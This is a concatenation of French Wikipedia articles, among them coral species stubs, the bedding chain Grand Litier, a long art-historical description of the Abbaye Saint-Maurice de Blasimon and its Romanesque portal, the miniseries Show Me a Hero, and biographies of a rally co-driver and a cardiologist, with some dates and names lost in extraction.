Caryophyllia scillaemorpha est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413397" url="https://fr.wikipedia.org/wiki?curid=9413397" title="Clement Kimutai">
Clement Kimutai



</doc>
<doc id="9413401" url="https://fr.wikipedia.org/wiki?curid=9413401" title="Combat de Llado">
Combat de Llado



</doc>
<doc id="9413404" url="https://fr.wikipedia.org/wiki?curid=9413404" title="Teen Days, Futures Star">
Teen Days, Futures Star



</doc>
<doc id="9413409" url="https://fr.wikipedia.org/wiki?curid=9413409" title="Grand Litier">
Grand Litier

Grand Litier est une enseigne de distribution française, spécialisée dans la vente de produits de literie.
Le siège social de l’enseigne se situe à Portet-sur-Garonne.
Historique.
Grand Litier trouve son origine dans un réseau de professionnels de literie indépendants nommé « Les Grands Litiers de France », créé en 1977. Ce dernier est ainsi devenu le premier réseau de distributeurs indépendants en literie moyenne et haut de gamme.
C’est en 1990 que le réseau « Les Grands Litiers de France » deviendra le réseau « Grand Litier ». 
Depuis , c’est la société First Service, propriétaire de la marque Grand Litier, qui a repris en direct l’exploitation de la chaîne de magasins sous l’égide de Wolf JL Stolpner, président de l’association des adhérents au réseau.
Depuis 2012, Grand Litier fait partie des 24 actionnaires associés d'Éco-mobilier afin de créer une nouvelle filière de recyclage des meubles.
Implantations.
En 2020, l’enseigne comptait plus de 110 magasins répartis en France métropolitaine; dans les DOM, en Martinique et à la Réunion. Grand Litier représente le deuxième réseau français spécialisé en literie par le nombre de points de vente, derrière l’enseigne Maison de la Literie. Les magasins, d’une surface allant de 300 à 800 m2 sont implantés dans les zones commerciales en périphérie des villes ou bien en centre-ville.
Ces magasins sont indépendants, pour la plupart du temps, de petites sociétés de type SARL.
Produits.
Grand Litier concentre ses activités sur la literie au sens large : matelas, sommiers, convertibles, linge de lit, oreillers, têtes de lit et autres accessoires de literie. 
Les produits commercialisés dans les magasins Grand Litier sont fabriqués par des marques nationales et internationales comme André Renault, Bultex, Epeda, Dunlopillo, Simmons, Tempur et Treca.

</doc>
<doc id="9413411" url="https://fr.wikipedia.org/wiki?curid=9413411" title="Caryophyllia scobinosa">
Caryophyllia scobinosa

Caryophyllia scobinosa est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413412" url="https://fr.wikipedia.org/wiki?curid=9413412" title="Runaway Slave">
Runaway Slave

Runaway Slave est le premier album studio de Showbiz &amp; A.G., sorti le .
L'album s'est classé au Top R&amp;B/Hip-Hop Albums.

</doc>
<doc id="9413414" url="https://fr.wikipedia.org/wiki?curid=9413414" title="Henry Wickham">
Henry Wickham

Henry Wickham peut faire référence à:

</doc>
<doc id="9413422" url="https://fr.wikipedia.org/wiki?curid=9413422" title="Dictionnaire des artistes plasticiens de Belgique des XIXe et XXe siècles">
Dictionnaire des artistes plasticiens de Belgique des XIXe et XXe siècles

Le Dictionnaire des artistes plasticiens de Belgique des , communément appelé Le Piron, est un ouvrage de référence concernant les artistes plasticiens belges.
Présentation.
Peintres, dessinateurs, sculpteurs, photographes ou céramistes sont présentés avec des commentaires, de nombreuses données biographiques et une présentation de l’œuvre et de l'évolution de chaque artiste. Tout artiste de Belgique peut demander à figurer dans cet ouvrage par un envoi de formulaire auprès de la rédaction.
La nouvelle édition annoncée pour 2010 n'est jamais parue, à la suite de la faillite des éditions Artedis et la condamnation pour escroquerie des éditeurs en juillet 2017. La base de données en ligne "nobel.be" n'est plus accessible.

</doc>
<doc id="9413426" url="https://fr.wikipedia.org/wiki?curid=9413426" title="Nikolaï Debolski">
Nikolaï Debolski

Nikolaï Debolski (en russe : Дебо́льский Николай Григорьевич), né en 1842 et mort en 1918, est un philosophe russe.
Il s'est particulièrement attaché à discuter la pensée d'Emmanuel Kant. 

</doc>
<doc id="9413435" url="https://fr.wikipedia.org/wiki?curid=9413435" title="Abbaye Saint-Maurice de Blasimon">
Abbaye Saint-Maurice de Blasimon

L'abbaye Saint-Maurice de Blasimon est une ancienne abbaye catholique située sur la commune de Blasimon, dans le département de la Gironde et la région naturelle de l'Entre-deux-Mers, en France.
Son abbatiale est devenue l'église Saint-Nicolas.
Localisation.
L'abbaye se trouve au nord du village, sur un terrain enserré entre deux routes départementales, la RD127 qui mène vers le nord-ouest à Mérignas et la RD17 qui mène vers le nord-est à Bossugan et au-delà à Castillon-la-Bataille.
Historique.
La plus ancienne mention concernant l'abbaye de Blasimon, nous provient du cartulaire du monastère Saint-Pierre de La Réole. En 980, selon la date fournie par le cartulaire, l'abbé de Blasimon cède au monastère de "Squirs", devenu La Réole, un alleu en vignes pour le salut de son âme et celle de ses parents. L'abbatiale est consacrée à saint Maurice. L'église a été probablement construite entre le XIe et le XIIIe siècle ; aucun document relatif à la construction ne nous est parvenu. En effet, des vestiges de moellons attestent l'existence d'un bâtiment dès le XIe siècle. Ce faisant, la façade de l'église est édifiée au milieu du XIIe siècle et la travée occidentale de l'église est érigée durant la seconde moitié de ce siècle. L'édifice est remanié au XIIIe siècle avec notamment la construction des voûtes d'ogives et des supports intérieurs. "A contrario" de l'époque médiévale pour laquelle il n'existe aucune information textuelle qui relate l'état de l'église ou des bâtiments monastiques, on possède à partir du XVIe siècle des sources textuelles sur l'ensemble architectural. Le monastère fut assiégé par les Huguenots en 1587 pendant la Guerre de religion. Après le siège et à cause des dégâts infligés à l'édifice, les moines se sont retirés au prieuré de Sauveterre, jusqu'en . Ces épisodes de l'histoire de l'abbaye ont laissé des témoignages écrits qui témoignent de l'état de l'abbaye à l'époque moderne. Ce faisant, il ne subsiste des bâtiments monastiques que l'aile orientale du cloître, construite au XIIe siècle, en effet, à partir de 1778 l'abbaye est officiellement démantelée et en partie détruite. Le site de l'abbaye était entouré, postérieurement à la construction de l'église, mais à une date encore indéterminée, d'une enceinte fortifiée et de fossés. La Gamage alimentait les fossés de l'enceinte. Ces fossés ayant été négligés, les alentours de l'église se transformèrent en marais. En 1855 le curé de Blasimon, M. Monmaton, fit combler les fossés.
L'abbaye aujourd'hui.
La description sommaire qui suit présente l'extérieur de l'abbaye, en commençant avec la façade nord de l'église et en suivant le sens des aiguilles d'une montre. Elle est complétée par une description détaillée de la façade occidentale de l'église, véritable bijou de l'art roman.
Façade nord de l'église : 
Façade est de l'abbaye : le chevet plat de l'église a été restauré au milieu du . Le mur extérieur du cloître comporte une fenêtre Renaissance et deux meurtrières.
Côté sud de l'abbaye : il reste des vestiges du mur d'enceinte ; la base de la tour ronde avec le départ de l'escalier en vis et la tour carrée, dite tour Saint-Nicolas, percée d'archères en faisait partie. Elle a ensuite été transformée en pigeonnier.
Façade sud de l'église : à la première travée se trouve l'aboutissement du mur d'enceinte ; une fenêtre murée et au milieu du mur un arc-boutant bas, comme sur la façade nord.
Bâtiments conventuels : les bâtiments claustraux sont en ruines.
L'église Saint-Nicolas.
L'église Saint-Nicolas se présente de plan rectangulaire, dont l'orientation s'incline un peu vers le nord. Elle comprend trois travées pour la nef plus une travée pour le chœur. Elles sont toutes voûtées d'ogives. Les quatre travées sont de longueurs inégales.
Vers 1150 une rénovation est entreprise : la façade et la première travée sont totalement refaites. Le portail date de cette époque.
L'ensemble de l'édifice est achevé au début du avec la construction des voûtes gothiques des travées et la réfection des murs des trois dernières travées soutenus par de nouveau contreforts. Les fenêtres latérales, très simples, sont généralement percées à raison de deux par travée, de chaque côté. Il existe à l'Est quatre baies, posées sur deux rangs, une fenêtre, puis trois fenêtres et, à l'ouest, une large fenêtre géminée, sur deux rangs, une, trois, et à l'ouest une large fenêtre géminée.
Dans la deuxième travée nord se trouve une porte à au-dessus du sol actuel. On l'atteint depuis la nef par une échelle volante. Elle donne sur un escalier qui permet d'accéder sur les voûtes. C'était aussi un refuge en cas d'attaque, comme en 1587.
La porte principale est à l'ouest ; une autre porte, actuellement obturée, ouverte dans le flanc sud de la travée du sanctuaire, donnait dans le cloître.
Au , un pignon obtus de cinq baies ogivales coiffe la façade.
Au , l'édifice, longtemps mal entretenu, était très dégradé. En 1844, J. Girard, architecte de la Commission départementale des Monuments historiques, fit un devis des travaux. Ce document est très pessimiste : le mur de façade était « on ne peut plus dégradé ; la porte ne pouvait être réparée « que par le remplacement presque total des douelles, tambours et chapiteaux » ; la fenêtre placée au-dessus de cette porte devait être démolie et refaite », etc. En 1848-1849, il fut procédé à une restauration partielle de l'église. On n'avait heureusement pas exécuté en entier le projet de Girard : dans la porte on avait logé des fûts, taillé maladroitement des bases, substitué des blocs bruts à deux chapiteaux et à la moitié d'un autre. Presque toute la sculpture a été sauvée du désastre.
La façade occidentale de l'église.
Le premier niveau de la façade concerne le programme figuré principal : un portail agrémenté de six voussures sculptées et deux portes latérales aveugles. Le portail de Blasimon appartient à l'école poitevine; il ressemble fort aux portails bien connus des églises Saint-Pierre d'Aulnay, Notre-Dame-la-Grande de Poitiers, Notre-Dame de Charmant ou Notre-Dame-de-la-Couldre de Parthenay.
Un seul thème y est développé, celui de la confrontation du chrétien avec ses passions ou plaisirs : la musique, la danse, la chair et la bonne chère. Les plaisirs ou les instincts sont figurés traditionnellement par les bêtes, puisque les ecclésiastiques avaient coutume de dire qu'ils rabaissent l'homme au rang de l'animal. Pour le programme secondaire, une série de beaux modillons ornent la corniche. L'analyse des chapiteaux est rendue parfois difficile par l'érosion, celle des modillons de la corniche est plus facile.
Les chapiteaux sont tellement serrés qu'il forment deux larges et splendides frises aux sommets des colonnettes. Les six voussures sont richement sculptées. Sur la voussure interne sont disposés quatre Anges ; sur la quatrième, quatre Vertus foulant aux pieds des Vices ; l'archivolte externe porte des scènes de chasse ; le reste des voussures est couvert d'une flore stylisée.
Le deuxième étage est aniconique, à l’exception d'une tête du encastrée en réemploi. L'arcature campanaire du troisième niveau est postérieure aux destructions perpétrées par le siège des Huguenots en 1587. Le pignon triangulaire à cinq baies ogivales, ajouté au , n'a pas de sculpture figurée.
Le portail principal.
Le portail a été classé en 1875. Les sculptures sont considérées comme étant parmi les plus belles de la Gironde.
La comparaison de la photographie de Jean-Auguste Brutails, de 1912, avec une photographie de 2015, montre que l'état du portail s'est dégradé depuis un siècle. Des mesures de conservation s'imposent.
Ébrasure sud.
Chapiteaux I et V : sculptures modernes.
 
Sur la gravure de Léo Drouyn (1843) on discerne un chapiteau I sculpté sur deux colonnes, mais sans pouvoir distinguer les détails. Le chapiteau V porte un décor végétal. La photographie de Brutails (1912) est nette. Le chapiteau I, la partie basse du chapiteau V et ses colonnes, sont neufs, sans sculpture. Ils datent de la restauration de 1848-1849. Aujourd'hui, on trouve des chapiteaux I et V sculptés : pour le chapiteau I, un homme écartant de sa tête serpents et quadrupèdes ailés et pour le chapiteau V un décor ornemental. En effet, les deux corbeilles ne datent que de 1961. Il est peu probable que le scénario du chapiteau I ait le moindre rapport avec le chapiteau historié originel.
Chapiteau II : homme caressant les lions. La corbeille est assez érodée. En 1843, Léo Drouyn l'avait dessinée et il y a des détails que l'on ne trouve plus aujourd'hui. Sur l'angle de la corbeille, un homme, assis sur un siège orné de pieds animaliers, les jambes croisées, est encadré par deux lions assis, dont la queue rentrée s'épanouit en panache. La tête du personnage est penchée du côté gauche et son bras droit touche la poitrine du fauve situé de ce côté. Le scenario n'est pas celui d'un Daniel dans la fosse aux lions, mais d'un contre-exemple, comme sur le chapiteau IV de l'ébrasure nord. Le bon exemple s'enchaine immédiatement.
Chapiteau III : homme tuant les lions. Un personnage en robe longue est assis entre deux lions adossés et détournés, qui penchaient leur tête vers la sienne. Insensible à leurs tentations, l'homme vient de planter un coutelas dans la gorge de chacun. Par comparaison avec l'exemple précédent, au lieu d'écouter ses propres démons, l'homme a trouvé la force de les dompter.
Chapiteau IV : deux hommes autour d'un arbre.
Sur l'angle de la corbeille se trouve un arbuste étrange, avec des rameaux et des fruits ronds. Sur chaque côté de l'arbre, on peut observer un jeune homme sémillant, peigné avec affectation, en train d'empoigner les rameaux. Derrière l'homme à droite, un lion, avec queue rentrée et épanouie, les observe.
La corbeille est aujourd'hui dégradée, mais il est évident qu'à l'origine la sculpture était très raffinée et il est improbable qu'elle représente deux paysans locaux en train de tailler un arbuste quelconque, surtout avec le lion maléfique. Il faut rechercher une signification moins banale et reliée au registre moralisateur.
Ébrasure nord.
Chapiteau I : hommes caressant des animaux.
Ce chapiteau double est partiellement authentique. La partie basse des deux corbeilles a été refaite en 1961.
La face interne montre un homme à cheveux longs en tunique. Il élève son genou droit comme pour escalader. De sa main droite il lisse le plumage d'un oiseau géant et sa main gauche touche la queue tirebouchonnée d'un lion, que l'érosion a ravagé.
Sur la face externe de la corbeille se trouve un personnage (aujourd'hui décapité) qui écarte ses deux bras pour caresser l'encolure de deux félins qui détournent la tête. Deux gros tentateurs, un poisson géant au corps torsadé et un oiseau tenant dans ses serres une crosse végétale, effleurent les oreilles de l'homme.
Ces deux hommes, captivés par l'animalité, symbolisent des pécheurs. Pour celui qui caresse la queue du lion, il s'agit d'un péché sexuel.
Chapiteau II : musiciens et danseuse.
Sur l'angle de la corbeille se trouve une danseuse (décapitée et sans avant- bras). Elle porte une robe longue, qui, sous le mouvement de la danse, est entrouverte et montre ses jambes et ses cuisses. De chaque côté de la danseuse, assis sur des chaises en bois tourné, on observe des musiciens. Celui de gauche, aux cheveux crépus, joue de la vièle et celui de droite, aux cheveux longs, joue du psaltérion. Tous les deux sont nu-pieds et avec les jambes croisées.
Le jeu des jambes dans la symbolique médiévale du corps était propre aux noceurs et libertins. Le thème de la danse était une incitation à la luxure.
Chapiteau III : deux félins affrontés.
La face droite de la corbeille est plus dégradée que celle à gauche. On voit deux félins à long cou affrontés à un bouquet végétal sur l'angle en détournant la tête. L'animal à gauche tient le bout de sa queue dans la bouche. Cette dernière, ornée d'un galon perlé, après s'être glissée entre les cuisses, remonte en boucle au-dessus de la croupe.
Dans le répertoire médiéval, l'image de la queue était le substitut iconique pour représenter le sexe mâle et désigner les péchés honteux lorsqu'elle était rentrée. Il existe des dizaines de milliers d'exemples dans le bestiaire roman.
La bête à droite a perdu sa tête et une partie de sa queue. Il est probable que la sculpture soit symétrique.
Chapiteau IV : dragons et faux dompteur.
Au centre de la face principale se trouve un petit démon nu. Il lève ses mains pour se saisir de la langue des deux dragons qui l'encadrent. Ses jambes, très écartées, se terminent par des griffes qu'il referme sur la queue serpentine des deux monstres. Sur l'autre face de la corbeille, deux dragons ailés s'affrontent. Ils ont mutuellement emmêlé corps et queues de telle façon que chacun suce sa propre queue.
Le scenario est une parodie, assez populaire, de l'homme « Maître des bêtes », où l'homme maîtrise ses instincts animaux en repoussant ou en tuant des monstres lubriques. Ici, l'homme fait union avec les bêtes en tenant leur langue. Le bon exemple à suivre est celui de l'homme sur le chapiteau II de l'ébrasure sud, où il tue les monstres maléfiques. C'est peut-être aussi le sens de son voisin, le chapiteau I (de 1961).
Chapiteau V : démon impudique.
Sur l'angle de la corbeille se trouve un démon hirsute et cornu. Il est accroupi et a passé ses bras sous ses cuisses, puis les a remontés pour que ses deux index puissent maintenir sa bouche grande ouverte. Sa langue saillit et pendouille sur le gland d'un pénis gigantesque, percé d'un profond méat urinaire. Dans la typologie romane cette caricature se trouve fréquemment. Par exemple sur la fenêtre sud de l'église Saint-Herie de Matha (également une création et dépendance des moines de Saint-Jean-d'Angély), sauf que dans ce cas le 'démon' est un moine dévêtu ; à Vézelay, sur le chapiteau qui raconte l'enlèvement du beau Ganymède par le lubrique Zeus, une grosse tête de démon cornu fait le même geste ; à La Chaize-le-Vicomte, sur un chapiteau dans la nef, le moine qui sodomise un confrère tire également sa langue.
Des démons, tireurs de langue ou des commissures sont légion parmi les modillons (voir Iconographie des modillons romans pour plus de détails). C'est une mimique qui avait valeur de provocation grave et d'insulte à caractère sexuel, à ne pas confondre, comme certains guides le disent, avec le péché de gourmandise.
Les voussures.
Trois des six voussures sont historiées, qui alternent avec des séries de feuillages ornementaux en très haut relief. Toutes les figurations humaines ont été décapitées, soit par les Huguenots de 1587, soit lors de la Révolution française.
Les voussures historiées (I, IV et VI) ont comme thèmes : Les anges adorant l'Agneau de Dieu ; quatre Vertus domptant quatre Vices et trois scènes de chasse.
II faut ajouter le portail de Blasimon à la liste de ces portes dont l'ornementation est inspirée de la Psychomachie de Prudence.
Voussures II, III : décor végétal.
Les voussures II, III et V sont des séries de feuillages ornementaux en très haut relief : les uns en S perlés, mais surtout ces feuilles plissées et accolées en éventail. La voussure V est illustrée avec la voussure IV. Elles sont parmi les plus belles que l'art roman ait produit. Leur style indique clairement leur origine poitevine.
Voussure I : les quatre anges.
Les quatre anges se tiennent debout au creux de la voussure. Ils sont nimbés, vêtus de tuniques longues et foulent de leurs pieds nus les nuages arrondis. Leurs ailes, évidées en cercle, sont pointées en direction d'un clipeus sommital entourant l'Agneau de Dieu, vers lequel ils font acte d'adoration (de l'agneau il ne reste que des bribes éparses : un nimbe crucifère, des fragments du Livre, une patte arrière et une partie de la queue).
Pour des anges du premier niveau, seuls le torse peut se prêter à l'analyse. Tous les deux présentent à l'observateur une paume ouverte, en signe d'apaisement. L'autre main fait un geste difficile à interpréter.
L'ange au deuxième niveau au sud est complet (sauf pour la tête). On le voit lever l'index de la main droite pour bien montrer l'agneau crucifère. La paume de la main gauche est tournée vers sa poitrine. Celui au nord a la paume de sa main gauche tournée vers l'observateur et son bras droit pointe vers le ciel. L'ange portait divers objets. Autour de la main gauche on voit clairement une couronne et pour la main droite, malheureusement disparue, on discerne quelques fragments d'objets sur l'aile gauche. Il est possible que l'ange présentait à l'Agneau les "Arma Christi" : couronne d'épines, clous, lance etc.
Voussure IV et V : quatre Vertus domptant quatre Vices et décoration végétale.
La voussure IV est la plus célèbre des voussures de Blasimon. Sous une forme allégorique, les Vertus, des guerrières déterminées, armées, souvent casquées d'un heaume conique et portant un bouclier, piétinent et pourfendent les Vices qui leur sont corrélés. L'Enfer est aussi présent sous forme de flammes sous les corps des vaincus. Seule l'épigraphie permet d'identifier ces couples antagonistes. Par exemple, à l'église Saint-Gilles d'Argenton-les-Vallées le chanfrein légendé donne l'identification de chacune : "CASITAS" (la chasteté) tue à coup de lance "LIBIDO" (le désir érotique) ; "PACIENCIA" (la patience) extermine "IRA" (la colère) etc. Ici, la voussure n'est pas légendée et seulement un couple au sud, où la Vertu tue un démon ithyphallique, peut être identifié à "CASITAS/LIBIDO". En Gironde, on trouve une voussure semblable à l'église Notre-Dame de Castelviel.
Les Vertus au nord : les deux Vertus portent un bouclier qui remonte jusqu'à mi-corps, dont le style a permis aux spécialistes de dater les sculptures entre 1150 et 1170. Elles ont triomphé des Vices à la pointe de l'épée (brisée) pour la première et avec une lance (dont on ne voit que des morceaux de la hampe) pour la seconde.
Les Vertus au sud : elles sont beaucoup plus féminines. Elles ne portent plus l'encombrant attirail militaire, mais d'élégantes robes moulantes. La première enfonce le fer de sa lance dans la gorge d'un quadrupède qui est sur le dos, déjà dans les flammes de l'Enfer. La seconde héroïne a perforé le crâne d'un satyre ithyphallique, qui s'accroche à sa robe, avec son épée.
Voussure VI : épisodes cynégétiques.
L'archivolte extérieure en bas-relief sur le mur nu est consacrée à des scènes de chasse. Les sujets, à partir du nord sont :
La fréquence de la contiguïté du sacré et du profane dans les sculptures romanes a conduit certains guides à dire que ces scènes de chasse signifiaient "l'âme poursuivie par le diable" ; le gibier représentant l'âme et les divers chasseurs le diable. L'idée est naïve et ne prend en compte ni le symbolisme des animaux, ni l'importance de la chasse à l'époque.
Il y a trois épisodes distincts :
La séquence sculptée ici correspond exactement à la formulation de saint Bernard, lorsqu'il fulminait contre cette imagerie de la chasse : "Tubicinantes" (les sonneurs), "venatores" (les chasseurs) et "monstruosi centauri" (centaures). Le thème de la chasse a su égayer les chapiteaux des églises, les tympans des abbayes et les chambres de quelques papes (Porte Saint-Ours de la collégiale Saint-Ursin de Bourges ; église Saint-Hilaire de Melle, église Saint-Seurin de Gabarnac ; la chambre du cerf de Clément VI, au palais des papes d'Avignon etc.)
Les portes feintes.
L'arc aveugle nord
L'arc aveugle sud
Les modillons de la corniche.
Quatorze modillons soutiennent la corniche, dont dix sont figurés. Comme d'habitude avec les modillons romans, il y a derrière les figures le prêche d'une leçon de moralité. Ici, on trouve des têtes d'hommes qui sont 'soignés', barbes et moustaches sont élégantes, les cheveux sont peignés et, à côté d'eux, on voit les êtres maléfiques. Le péché le plus fréquemment dénoncé, parmi les péchés capitaux dans les séries de modillons, est celui de la luxure ; à Blasimon il semble être le péché de la Vanité.
L'intérieur de l'église.
Il existe un escalier, logé dans une cage carrée faisant saillie sur le flanc nord, qui conduit sur les voûtes ; il part à 4,30 m au-dessus du sol actuel, et on l'atteint de la nef par une échelle volante. L'intérieur de l'église fut entièrement remaniée et re-voûtée aux , , de sorte qu'il ne reste aucune sculpture figurée romane. On trouve seulement les six culots à têtes grimaçantes, qui sont typiquement gothiques. 
En ce qui concerne le mobilier :
Protection du patrimoine.
L'ancienne abbaye Saint-Nicolas est classée au titre des Monuments historiques par un arrêté en date du . L'ancienne église abbatiale Saint-Maurice, actuelle église Saint-Nicolas est classée par la liste de 1875.

</doc>
<doc id="9413446" url="https://fr.wikipedia.org/wiki?curid=9413446" title="Caryophyllia secta">
Caryophyllia secta

Caryophyllia secta est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413451" url="https://fr.wikipedia.org/wiki?curid=9413451" title="Out of Time">
Out of Time

Out of Time est une expression anglaise signifiant « hors du temps » ou « à court de temps ».

</doc>
<doc id="9413457" url="https://fr.wikipedia.org/wiki?curid=9413457" title="Show Me a Hero">
Show Me a Hero

 est une mini-série américaine créée par David Simon et réalisée par Paul Haggis. Elle est diffusée entre le et le sur , et est adaptée du livre éponyme de Lisa Belkin, ancienne journaliste au New York Times. 
Tout comme le livre, la mini-série décrit la résistance d'un quartier de la classe moyenne blanche à un projet de logements sociaux dispersés, imposé par le gouvernement fédéral, à Yonkers, dans l'État de New York, et la façon dont la tension issue de cette situation a affecté la ville dans son ensemble. 
Synopsis.
L'histoire se déroule entre 1987 et 1994 à Yonkers, une ville située au nord de New York City dans le comté de Westchester, et se concentre sur les efforts de déségrégation des logements sociaux.
Le juge fédéral Leonard B. Sand s'est prononcé contre Yonkers et a émis une ordonnance de déségrégation, exigeant que des logements publics de 200 appartements soient construits dans les quartiers de classe moyenne, principalement blanc, de l'est de Yonkers. En 1988, la ville a déjà dépensé 11 millions de dollars en frais juridiques pour lutter contre l'ordonnance, y compris une tentative infructueuse de faire appel auprès de la Cour suprême des États-Unis. Cette affaire a attiré l'attention de tout le pays sur les questions de race, de classe et de logement. Le maire Nick Wasicsko a fait campagne en s'opposant à l'ordonnance du juge, mais avant d'entrer en fonction, il s'est fait l'avocat de la déségrégation à Yonkers. Wasicsko et les conseillers municipaux qui l'ont soutenu ont élaboré un plan pour respecter l'ordonnance du tribunal et construire les 200 logements éparpillés sur huit sites différents de seulement 25 logements chacun, répartis dans une ville qui compte plus de 10 000 logements. Malgré cela, quatre conseillers - une majorité - ont refusé de voter pour faire respecter la loi, s'opposant systématiquement à toute déségrégation limitée. Pour avoir refusé de suivre l'ordonnance du tribunal, la ville de Yonkers a été paralysée par de lourdes amendes. Celles-ci sont estimées à près d'un million de dollars par jour à partir d'une charge composée qui commençait à 100 dollars par jour. Ces amendes pouvant entraîner la faillite de la ville. Les services de base de la ville ont été interrompus, les parcs et les bibliothèques ont été fermés, et 630 employés municipaux ont dû être licenciés afin de maintenir un budget suffisant pour les services de police et d'incendie. Les protestations se sont poursuivies, et Wasicsko et d'autres personnes ont reçu des menaces de mort, telles que des lettres contenant des balles avec la mention "Vous ne verrez pas la prochaine". Wasicsko a été contraint d'obtempérer. Le procès a finalement été réglé en mai 2007. 
Outre les membres du conseil municipal de Yonkers et d'autres politiciens locaux, deux groupes ont pris des positions opposées sur la question : la "fédération Save Yonkers", dirigée par Jack O'Toole, qui était contre la déségrégation et a voté pour défier l'ordonnance fédérale, et les "Citizens and Neighbors Organized to Protect Yonkers" ("Canopy"), qui ont soutenu l'ordonnance du tribunal, souhaitant mettre fin aux amendes paralysantes. La secrétaire d'État de New York, Gail Shaffer, a été nommée par le gouverneur de l'époque, Mario Cuomo, présidente du Yonkers Emergency Financial Control Board, qui était chargé de gérer les finances de la ville en 1988, alors que les amendes réduisaient tous les services municipaux et que la ville était en faillite. La Housing Education Relocation Enterprise (H.E.R.E.) était une organisation communautaire qui soutenait les locataires emménageant dans les logements sociaux dispersés.
La ville de Yonkers engage l'urbaniste Oscar Newman, à l'origine de la théorie de l'espace défendable (Defensible space theory), pour travailler avec le département du logement et du développement urbain des Etats-Unis sur le plan d'urbanisation de la ville. Les théories de Newman soulignent la valeur des petits groupes de maisons en rangée avec cour, plutôt que des immeubles d'appartements à plusieurs étages, afin de donner un sentiment de propriété aux résidents à faible revenu, tout en étant immergés dans les activités et la culture des quartiers de classe moyenne. Les défis des quartiers sociaux existants (appelés projects aux Etats-Unis) sont montrés dans la série à travers la vie d'un certain nombre de familles qui y vivent. 
Commentaires.
Après "" à Baltimore ou "Treme" à la Nouvelle-Orléans, le créateur de la série David Simon essaye une nouvelle fois de montrer les dynamiques à l’œuvre dans une ville américaine. Cependant, alors que les protagonistes étaient fictifs dans ses séries précédentes, la quasi-totalité des personnages de "Show Me a Hero" ont réellement existé à l'époque des faits.
Comme expliqué par l'un des personnages, c'est une citation de Francis Scott Fitzgerald qui a inspiré le titre du livre et de la minisérie : « Montrez-moi un héros, et je vous écrirai une tragédie » (« "Show me a hero and I will write you a tragedy"»).
Accueil critique.
"Télérama" indique que .

</doc>
<doc id="9413458" url="https://fr.wikipedia.org/wiki?curid=9413458" title="Neoma">
Neoma

Neoma peut faire référence à :

</doc>
<doc id="9413460" url="https://fr.wikipedia.org/wiki?curid=9413460" title="Caryophyllia seguenzae">
Caryophyllia seguenzae

Caryophyllia seguenzae est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413464" url="https://fr.wikipedia.org/wiki?curid=9413464" title="Fonds de solidarité">
Fonds de solidarité

Le terme de "fonds de solidarité" peut désigner :
et divers autres organismes, dont :

</doc>
<doc id="9413466" url="https://fr.wikipedia.org/wiki?curid=9413466" title="Caryophyllia sewelli">
Caryophyllia sewelli

Caryophyllia sewelli est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413472" url="https://fr.wikipedia.org/wiki?curid=9413472" title="Paul Nagle">
Paul Nagle

Paul Nagle est un copilote de rallye irlandais né le à Killarney.
Biographie.
Nagle commence sa carrière en rallye en 1997. Sa première participation en championnat du monde est au rallye de Catalogne de 2004.
Copilote de Kris Meeke pour l'écurie Citroën, il remporte le rallye d'Argentine en 2015.
La saison suivante, le duo s'adjuge le rallye du Portugal et le rallye de Finlande.
Lors de la saison 2017, la paire fait à nouveau main basse sur deux épreuves avec le rallye du Mexique et le rallye de Catalogne.
La saison 2018 est cependant moins prolifique. En effet, lors du Tour de Corse, Paul Nagle s'emmêle dans ses notes et provoque la sortie de route de l'équipage. Ensuite, au Rallye du Portugal, Kris Meeke commet deux erreurs impliquant deux sorties à haute vitesse conduisant à deux abandons consécutifs. Peu après, le Citroën Racing annonce remercier le duo pour la suite de la saison, l’équipe mentionnant les .
Il est annoncé en octobre 2018 que Kris Meeke fait son retour pour la saison 2019 chez Toyota mais sans Paul Nagle comme copilote, le britannique expliquant qu'il ressentait le besoin de vivre quelque chose de différent, y compris concernant l'ambiance dans la voiture.

</doc>
<doc id="9413473" url="https://fr.wikipedia.org/wiki?curid=9413473" title="Cdi">
Cdi



</doc>
<doc id="9413475" url="https://fr.wikipedia.org/wiki?curid=9413475" title="Luc Hittinger">
Luc Hittinger

Luc Hittinger, né le , est un cardiologue français. 
Il a été président de l’université Paris-Est Créteil (UPEC) de à . Il a succédé à ce poste à Simone Bonnafous, universitaire spécialiste de la communication politique et médiatique.
Biographie.
Diplômé d'un doctorat en médecine, spécialité cardiologie, à l’université Pierre et Marie Curie (UPMC) (1984), il est également Docteur en sciences de l’Université Paris Sud, spécialité biologie et physiologie animale (1993). Il a obtenu son habilitation à diriger des recherches à l'Université Paris-Est Créteil (UPEC) en 1996. Au sein de l’Institut National de la Santé et de la Recherche Médicale (INSERM), il a été chargé de recherche (1989-1994), puis directeur de recherche (1994-1997), et a été responsable d’équipe de 1994 à 2006. Durant cette période, en lien avec l’équipe du professeur Stephen F. Vatner (États-Unis), il a développé différents concepts dans le cadre de l’insuffisance cardiaque, notamment le rôle de la circulation coronaire, celui des systèmes hormonaux et de leurs inhibiteurs dans la progression et dans la protection de cette maladie.
Cardiologue au Centre hospitalier universitaire Henri-Mondor, depuis 1997, Luc Hittinger a développé une unité consacrée à la prise en charge de l’insuffisance cardiaque, où à côté de la prise en charge de plus d’un millier de patients par an, il a pu mettre en place de nouvelles stratégies thérapeutiques pour lutter contre cette maladie et former de nombreux cardiologues spécialistes de ce domaine..
En lien avec ses travaux plus fondamentaux, il a également participé à la création, en 2005, d’une unité mixte de recherche – la première de ce type en France - entre l’université Paris-Est Créteil (UPEC) et l’École nationale vétérinaire d'Alfort.
À l'international, au travers de très nombreux séjours, il a collaboré pendant plus de 20 ans avec les universités d’Harvard, de Pennsylvanie (U Penn) et l'Université Rutgers, université d'État du New Jersey. Il a également dans ce cadre formé de nombreux chercheurs internationaux dans le domaine de l’insuffisance cardiaque.
De 2002 à 2007, Luc Hittinger a présidé la commission scientifique spécialisée INSERM puis où il a défendu la création de plusieurs équipes de recherche : Nancy, Montpellier, Rouen Lyon… De 2007 à 2009, il a présidé le groupe de réflexion sur la recherche cardiovasculaire (GRRC) qui rassemble les chercheurs du domaine cardiovasculaire et favorise le développement des carrières des jeunes chercheurs.
De 2006 à 2012, il a exercé les fonctions de vice-président du conseil scientifique de l’université Paris-Est Créteil (UPEC). Durant cette période, il a restructuré l’organisation de la recherche de l’UPEC en mettant en place :
